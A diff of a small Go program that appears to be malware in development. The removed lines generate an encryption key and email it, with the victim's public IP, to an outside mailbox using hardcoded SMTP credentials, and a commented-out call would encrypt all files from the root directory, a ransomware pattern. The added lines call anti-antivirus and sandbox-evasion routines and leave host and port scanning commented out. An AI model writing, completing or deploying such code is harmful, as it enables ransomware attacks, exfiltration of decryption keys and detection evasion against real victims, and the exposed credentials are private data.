@@ -1,33 +1,26 @@
 package main
 
 import (
-	"mail"
-	"enc"
-
-	"crypto/rand"
-
-	"github.com/redcode-labs/Coldfire"
+	"nofiles/antiav"
+	"log"
 )
 
+
 func main() {
-	key := make([]byte, 32)
-	_, err := rand.Read(key)
+	antiav.Sandbox()
+	err := antiav.Before()
 	if err != nil {
-		log.Println("Error generating random key:", err)
+		log.Println("Preparation failed:", err)
 	}
 
-	test := mail.SendEmail{Login: "funtoomen@disroot.org",
-		Password: `haslomaslo`,
-		Server: "disroot.org",
-		Port: 587,
-
-		To: []string{"mikolajl@danwin1210.de"},
-		Subject: coldfire.GetGlobalIp(),
-		Data: string(key[:])}
-	test.Send()
-
-//	err := enc.encryptFilesInDir("/", key)
+//	ips, err := antiav.Hosts()
 //	if err != nil {
-//		log.Println(err)
+//		log.Println("Scanning failed:", err)
 //	}
+//	ports := antiav.Ports(ips)
+
+	antiav.After()
+	if err != nil {
+		log.Println("Finishing failed:", err)
+	}
 }
